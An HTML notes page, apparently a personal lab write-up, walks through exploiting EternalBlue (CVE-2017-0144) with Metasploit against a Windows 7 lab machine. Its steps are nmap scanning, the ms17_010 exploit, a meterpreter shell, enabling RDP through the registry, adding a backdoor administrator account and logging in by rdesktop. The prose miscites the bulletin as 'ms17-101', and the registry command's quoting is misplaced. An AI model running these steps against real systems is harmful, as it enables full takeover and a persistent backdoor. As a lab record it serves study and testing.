<!DOCTYPE html>
<html lang="en">
<head>
<!-- 2022-08-31 Wed 18:52 -->
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>CVE-2017-0144</title>
<meta name="author" content="Honbey Zhang" />
<meta name="generator" content="Org Mode" />
<link rel="stylesheet" href="../resources/orgmode.css" type="text/css"/>
                     <link rel="stylesheet" href="../resources/style.css" type="text/css"/>
</head>
<body>
<div id="content" class="content">
<header>
<h1 class="title">CVE-2017-0144</h1>
</header>
<div id="outline-container-org5e3cc47" class="outline-2">
<h2 id="org5e3cc47">Introduction - Eternal Blue</h2>
<div class="outline-text-2" id="text-org5e3cc47">
<p>
利用 Metasploit 中针对 ms17-101 漏洞的攻击载荷进行攻击获取主机控制权限。“永恒之蓝”的原理主要是扫描所有开放 445 文件共享端口的 Windows 机器。445 端口可以在局域网中轻松访问各种共享文件夹或共享打印机。
</p>

<ul class="org-ul">
<li>Tool: Kali Rolling x64</li>
<li>Target Machine: Windows 7 Ultimate x64</li>
</ul>
</div>

<div id="outline-container-org1c9db49" class="outline-3">
<h3 id="org1c9db49">步骤</h3>
<div class="outline-text-3" id="text-org1c9db49">
<ol class="org-ol">
<li><p>
Bash
</p>
<div class="org-src-container">
<pre class="src src-bash">nmap -r 10.20.20.0/28 <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">search target (optional)</span>
msfconsole
</pre>
</div></li>

<li><p>
msfconsole
</p>
<div class="org-src-container">
<pre class="src src-bash">search ms17_010
use auxiliary/scanner/smb/smb_ms17_010
<span style="color: #006FE0;">set</span> rhosts 10.20.20.7
use exploit/windows/smb/ms17_010_eternalblue
<span style="color: #006FE0;">set</span> rhosts 10.20.20.7
run <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">exploit</span>
</pre>
</div></li>

<li><p>
meterpreter
</p>
<div class="org-src-container">
<pre class="src src-bash"><span style="color: #8D8D84;">#</span><span style="color: #8D8D84; font-style: italic;">if it not enter CMD automatically, input the below command in meterpreter</span>
shell
</pre>
</div></li>

<li><p>
CMD
</p>
<div class="org-src-container">
<pre class="src src-cmd">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
net user USERNAME PASSWORD /add
net localgroup administrators USERNAME /add
</pre>
</div></li>

<li><p>
Bash
</p>
<div class="org-src-container">
<pre class="src src-bash">rdesktop 10.20.20.7:3389
<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">then input the USERNAME and PASSWORD you had created</span>
<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">now you can control the target machine</span>
</pre>
</div></li>
</ol>
</div>
</div>

<div id="outline-container-org4276b61" class="outline-3">
<h3 id="org4276b61">Tips</h3>
<div class="outline-text-3" id="text-org4276b61">
<p>
The Below OS version may cause Blue Screen and cannot use successfully:
</p>
<ul class="org-ul">
<li>Windows 7 Home x86</li>
<li>Windows 7 Professional x86</li>
<li>Windows 7 Enterprise x86</li>
</ul>

<p>
It&rsquo;s likly the 32-bit OS of Windows 7 as the same case, but we can attack successfully on XP SP3(32-bit).
</p>
</div>
</div>

<div id="outline-container-org635e154" class="outline-3">
<h3 id="org635e154">参考链接</h3>
<div class="outline-text-3" id="text-org635e154">
<ol class="org-ol">
<li><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144">cve.mitre.org</a></li>
</ol>
</div>
</div>
</div>
</div>
<div id="postamble" class="status">
<a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
</div>
</body>
</html>
